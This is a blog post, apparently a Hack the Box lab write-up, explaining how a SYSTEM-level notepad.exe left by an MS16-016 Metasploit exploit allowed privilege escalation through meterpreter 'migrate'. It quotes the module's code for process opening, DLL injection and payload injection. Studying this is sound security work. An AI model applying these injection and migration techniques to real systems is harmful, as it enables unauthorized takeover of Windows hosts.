---
layout: post
title:  "Process All Access"
subtitle: "Hack the Box"
date:   2017-07-24 00:00:00
author: "coastal"
header-img: "images/htb/process-all-access/header.jpg"
---

Recently, I was working on privilege escalation from inside a Windows Server 2003 box. While I was enumerating the box, I took a look at the running processes and saw some interesting things.

```
>ps
PID   PPID  Name          Arch  Ses  User                Path
---   ----  ----          ----  ---  ----                ----
[...snip...]


2356  3312  cmd.exe        x86   0   IIS APPPOOL\Web     C:\Windows\system32\cmd.exe
2384  2784  notepad.exe    x86   0   NT AUTHORITY\SYSTEM C:\Windows\system32\notepad.exe
2732  1788  notepad.exe    x86   0   IIS APPPOOL\Web     C:\Windows\system32\notepad.exe
3312  1476  w3wp.exe       x86   0   IIS APPPOOL\Web     c:\windows\system32\inetsrv\w3wp.exe
```

We notice some curious processes for a remote server, specifically ```notepad.exe``` running as ```NT AUTHORITY\SYSTEM```. Now anyone familiar with meterpreter knows that ```notepad.exe``` is a favorite process to spin up as a host for the meterpreter session. Given the ```SYSTEM``` level access, it is likely that another hackthebox user has performed successful exploitation and is enjoying their new privileges. Just as a bit of a joke, I decided to try to receive some ill-gotten gains:

```
meterpreter > migrate 2384
[*] Migrating from 3312 to 2384...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Wait, whoops. I seem to have gotten myself ```SYSTEM``` without any of the heavy lifting! Congrats, right!

Well I decided that wasn't exactly sporting and ditched my shell. After I successfully performed the privilege escalation and got a proper ```SYSTEM```, I had to figure out why I had been able to own the box via ```migrate```. As I guessed (correctly) that the other user had performed priv esc via the same methodology, I checked the [source code](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb) of the exploit to see what was going on with the ```notepad.exe``` spawn.

```
print_status("Launching notepad to host the exploit...")
  notepad_process_pid = cmd_exec_get_pid("notepad.exe")
  begin
    process = client.sys.process.open(notepad_process_pid, PROCESS_ALL_ACCESS)
    print_good("Process #{process.pid} launched.")
  rescue Rex::Post::Meterpreter::RequestError
    print_error("Operation failed. Hosting exploit in the current process...")
    process = client.sys.process.open
end
```

So we try to spawn a new ```notepad.exe``` process that will host the exploit. If we are unable to spawn a new process, we use the current running process as the host. Offloading the escalation to a new ```notepad.exe``` is more stealthy than escalating the currently running process. As the running process ```w3wp.exe``` is an IIS worker process that handles requests sent to the IIS application pool, if our exploit crashes the process would die and most likely be noticed immediately by even an inattentive sysadmin. However, if a newly spawned ```notepad.exe``` process dies, it makes much less noise and doesn't impede application function.

The line of code in this section relevant to the strange behavior that we observed is:

```
process = client.sys.process.open(notepad_process_pid, PROCESS_ALL_ACCESS)
```

The notepad process is spawned with ```PROCESS_ALL_ACCESS``` designation. In the Windows Documentation on [Process Security and Access Rights](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx), we can see that this flag, when passed to ```CreateProcess``` gives the new process object all possible access rights. This means that the any processes running on the system can use the new process to create new processes and threads, duplicate its handle, query information about the process such as tokens and access codes, set information about the process, read and write to its memory, perform an operation on its address space, and do basically whatever it likes with the new process.

Assuming we are successful in our process creation, we next load the exploit ```.dll``` into the process 

```
print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
library_path = ::File.join(Msf::Config.data_directory, "exploits", "cve-2016-0051", "cve-2016-0051.x86.dll")
library_path = ::File.expand_path(library_path)
exploit_mem, offset = inject_dll_into_process(process, library_path)
print_status("Exploit injected ... injecting payload into #{process.pid}...")
payload_mem = inject_into_process(process, payload.encoded)
thread = process.thread.create(exploit_mem + offset, payload_mem)
sleep(3)
print_status("Done.  Verify privileges manually or use 'getuid' if using meterpreter to verify exploitation.")
```

As we can see, the lenient access rights on the process is what allows us to inject the exploit ```.dll``` and payload without complications, and execute the payload with ```SYSTEM``` privileges. 

Interestingly enough, it doesn't look like the exploit migrates the meterpreter session to the newly escalated ```notepad.exe``` process. Looking at the output of ```ps```, the ```notepad.exe``` process is not killed after exploitation. While we could set our payload to a reverse shell and catch our new ```SYSTEM``` privileges, we could also perform the exploit without any payload and migrate meterpreter into the elevated ```PROCESS_ALL_ACCESS``` process like we did earlier albeit accidentally. I decided to perform the priv esc that way and got myself a ```SYSTEM``` shell, but this time I earned it.

-coastal

---

### Resources

[Process Security and Access Rights](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx)

[w3wp.exe](https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)

[w3wp.exe](https://stackoverflow.com/questions/7822898/what-is-w3wp-exe)














